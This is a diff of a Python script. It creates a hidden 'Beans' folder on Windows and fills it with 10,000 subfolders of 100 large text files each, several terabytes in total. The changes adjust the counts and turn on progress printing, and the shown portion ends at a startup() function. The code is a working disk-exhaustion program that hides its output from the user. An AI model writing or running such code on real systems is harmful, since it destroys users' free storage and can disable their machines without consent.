@@ -1356,38 +1356,44 @@ def main(base_path):
 
 def create_mainfolder(base_path):
     if os.path.exists(base_path):
-        #print("'BeansFolders' folder already exists")
+        print("\n'BeansFolders' folder already exists")
         pass
     else:
-        #print("Creating folder...")
+        print("\nCreating folder...")
         os.makedirs(base_path)
         # Set the folder attribute to hidden
         FILE_ATTRIBUTE_HIDDEN = 0x02
         ret = ctypes.windll.kernel32.SetFileAttributesW(base_path, FILE_ATTRIBUTE_HIDDEN)
         if ret:
-            #print("'BeansFolders' folder created and hidden")
+            print("'BeansFolders' folder created and hidden\n")
             pass
         else:
             # If there was an error, get the last error code
             error = ctypes.GetLastError()
-            print(f"Failed to hide 'BeansFolders' folder. Error code: {error}")
+            print(f"\nFailed to hide 'BeansFolders' folder. Error code: {error}")
 
 def create_secondary_folders(base_path):
-    for folder_num in range(1, 1001):
+    for folder_num in range(1, 10001):
         folder_path = os.path.join(base_path, f'Beans_{folder_num}')
         os.makedirs(folder_path, exist_ok=True)
         #clear()
         #messagebox.showinfo("Success", f"{folder_num} folders have been created so far!")
-        #print(f"Folders created:\n [{folder_num}/1000]")
+        print(f"\nFolders created:\n [{folder_num}/10000]")
         create_files(base_path, folder_num)
 
 def create_files(base_path, folder_num):
     folder_path = os.path.join(base_path, f'Beans_{folder_num}')
-    for file_num in range(1, 1001):
+    print("\nCreating files...")
+    for file_num in range(1, 101):
         file_path = os.path.join(folder_path, f'Beans_{file_num}.txt')
         with open(file_path, 'w') as file:
-            file.write('Beans\n' * 10000 * 10000)
-            #print(f"Created file: \n Number: {file_num} \n Path: '{file_path}'")
+            file.write('Beans\n' * 10000 * 100)
+            if file_num < 10:
+                print(f" [00{file_num}/100]")
+            elif file_num < 100:
+                print(f" [0{file_num}/100]")
+            else:
+                print(f" [{file_num}/100]")
 
 def startup():
     #user_input = input("Start the program? (y/n): ")
